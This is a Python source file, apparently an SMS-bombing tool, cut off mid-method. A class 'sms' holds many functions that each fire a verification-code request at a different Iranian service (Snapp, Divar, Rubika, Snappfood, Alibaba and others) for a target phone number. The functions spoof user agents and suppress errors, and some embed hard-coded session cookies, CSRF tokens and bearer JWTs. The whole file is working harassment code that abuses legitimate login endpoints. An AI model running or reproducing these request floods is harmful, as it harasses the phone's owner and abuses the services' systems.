import json
from time import sleep
from random import choice
from requests import get, post
from user_agent import generate_user_agent


class sms:
    def snap(phone):
        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": generate_user_agent(os="android"), "content-type": "application/json", "accept": "*/*","origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        snapD = {"cellphone": phone}
        try:
            post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
            return True
        except:
            pass

    def shad(phone):
        shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
            return True
        except:
            pass


    def tap30(phone):
        tap30H = {"Host": "tap33.me", "Connection": "keep-alive", "Content-Length": "63", "User-Agent": generate_user_agent(os="android") , "content-type": "application/json", "Accept": "*/*","Origin": "https://app.tapsi.cab", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://app.tapsi.cab/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        tap30D = {"credential": {"phoneNumber": "0" + phone.split("+98")[1], "role": "PASSENGER"}}
        try:
            post(url="https://tap33.me/api/v2/user",  headers=tap30H, json=tap30D)
            return True
        except:
            pass


    def emtiaz(phone):
        emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": generate_user_agent(os="android"), "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
        emD = "send=1&cellphone=0"+phone.split("+98")[1]
        try:
            post(url="https://web.emtiyaz.app/json/login", headers=emH, data=emD)
            return True
        except:
            pass


    def divar(phone):
        divarH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://divar.ir','referer': 'https://divar.ir/','user-agent': generate_user_agent(os="android") ,'x-standard-divar-error': 'true'}
        divarD = {"phone": phone.split("+98")[1]}
        try:
            post(url="https://api.divar.ir/v5/auth/authenticate",  headers=divarH, json=divarD)
            return True
        except:
            pass


    def rubika(phone):
        ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
            return True
        except:
            pass


    def bama(phone):
        bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent": generate_user_agent(os="android"), "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8", "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
        bamaD = "cellNumber=0"+phone.split("+98")[1]
        try:
            post(url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
            return True
        except:
            pass


    def snapfood(phone):
        sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
        sfoodH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ','content-type': 'application/x-www-form-urlencoded','cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0','origin': 'https://snappfood.ir','referer': 'https://snappfood.ir/','user-agent': generate_user_agent(os="linux")}
        sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
        try:
            post(url=sfoodU,  headers=sfoodH, data=sfoodD)
            return True
        except:
            pass


    def alibaba(phone):
        alibabaH = {"Host": "ws.alibaba.ir", "User-Agent":generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR", "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy", "Content-Type": "application/json;charset=utf-8", "Content-Length": "29", "Origin": "https://www.alibaba.ir", "Connection": "keep-alive", "Referer": "https://www.alibaba.ir/hotel"}
        alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
        try:
            post(url='https://ws.alibaba.ir/api/v3/account/mobile/otp',    headers=alibabaH, json=alibabaD)
            return True
        except:
            pass


    def smarket(phone):
        smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
        smarketH = {'referer': 'https://snapp.market/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=smarketU, headers=smarketH)
            return True
        except:
            pass


    def arka(phone):
        # arka api
        arkaH = {"Host": "api.chartex.net", "User-Agent": generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Origin, Accept, Content-Type, Authorization, Access-Control-Allow-Origin", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk", "Cache-Control": "no-cache", "Plugin-version": "3.12.15", "Content-Type": "application/json;charset=utf-8", "Content-Length": "69", "Origin": "https://arkasafar.ir", "Connection": "keep-alive", "Referer": "https://arkasafar.ir/"}
        arkaD = {"mobile": "0" + phone.split("+98")[1], "country_code": "IR", "provider_code": "RUBIKA"}
        try:
            post(url='https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD)
            return True
        except:
            pass


    def sTrip(phone):
        sTripH = {"Host": "www.snapptrip.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "fa", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json; charset=utf-8", "lang": "fa", "X-Requested-With": "XMLHttpRequest", "Content-Length": "134", "Origin": "https://www.snapptrip.com", "Connection": "keep-alive", "Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad", "TE": "Trailers"}
        sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + phone.split("+98")[1], "country_code": "+98", "email": "example@gmail.com"}
        try:
            post(url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD)
            return True
        except:
            pass


    def filmnet(phone):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
        fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web','User-Agent': generate_user_agent(os="win"),'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/','Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache','Accept-Encoding': 'gzip, deflate'}
        try:
            get(url=fnU, headers=fNh)
            return True
        except:
            pass


    def drdr(phone):
        dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
        drh = {'Connection': 'keep-alive','Accept': 'application/json','Authorization': 'hiToken','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir','Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate'}
        try:
            post(url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"})
            return True
        except:
            pass


    def bahram_shop(phone):
        rhead = {"user-agent": generate_user_agent()}
        bahram_request = {"username": "0"+phone.split("+98")[1]}
        bahram = 'https://api.bahramshop.ir/api/user/validate/username'
        try:
            for i in range(0, 2):
                post(bahram, json=bahram_request, headers=rhead)
                sleep(0.2)
            return True
        except:
            pass


    def banimode(phone):
        bnJ = {"phone": '0'+phone.split('+98')[1]}
        bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
        bnH = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Access-Control-Request-Headers': 'content-type,platform','Access-Control-Request-Method': 'POST','Connection': 'keep-alive','Host': 'mobapi.banimode.com','Origin': 'https://www.banimode.com','Referer': 'https://www.banimode.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=bnU, headers=bnH, json=bnJ)
            return True
        except:
            pass


    def okcs(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://okcs.com/users/mobilelogin?mobile=0" + phone.split("+98")[1], headers=rhead)
            return True
        except:
            pass


    def binjo(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://api.binjo.ir/api/panel/get_code/0" + phone.split("+98")[1], headers=rhead)
            return True
        except:
            pass


    def chamedoon(phone):
        chJ = {"mobile": '0'+phone.split('+98')[1],"origin": "/","referrer_id": None}
        chU = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
        chH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D','origin': 'https://chamedoon.com','referer': 'https://chamedoon.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=chU, headers=chH, json=chJ)
            return True
        except:
            pass


    def kilid(phone):
        kiJ = {"mobile": '0'+phone.split('+98')[1]}
        kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
        kiH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json','COUNTRY_ID': '2','Host': 'server.kilid.com','LOCALE': 'FA','Origin': 'https://kilid.com','Referer': 'https://kilid.com/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=kiU, headers=kiH, json=kiJ)
            return True
        except:
            pass


    def pinket(phone):
        rhead = {"user-agent": generate_user_agent()}
        pinket_request = {"phoneNumber": "0"+phone.split("+98")[1]}
        pinket_url = 'https://pinket.com/api/cu/v2/phone-verification'
        try:
            post(pinket_url, json=pinket_request, headers=rhead)
            return True
        except:
            pass


    def otaghak(phone):
        rhead = {"user-agent": generate_user_agent()}
        otaghak_request = {"userName": "0"+phone.split("+98")[1]}
        otaghak_url = 'https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode'
        try:
            post(otaghak_url, json=otaghak_request, headers=rhead)
            return True
        except:
            pass


    def shab(phone):
        rhead = {"user-agent": generate_user_agent()}
        shab_request = {"mobile": "0"+phone.split("+98")[1], "country_code": "+98"}
        shab_url = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
        try:
            post(shab_url, json=shab_request, headers=rhead)
            return True
        except:
            pass


    def itoll(phone):
        itJ = {'mobile': phone}
        itU = 'https://app.itoll.ir/api/v1/auth/login'
        itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=itU, headers=itH, json=itJ)
            return True
        except:
            pass


    def pubisha(phone):
        rhead = {"user-agent": generate_user_agent()}
        pubisha_request = "mobile=0"+phone.split("+98")[1]
        pubisha_url = 'https://www.pubisha.com/login/checkCustomerActivation'
        try:
            post(pubisha_url, json=pubisha_request, headers=rhead)
            return True
        except:
            pass


    def wis(phone):
        try:
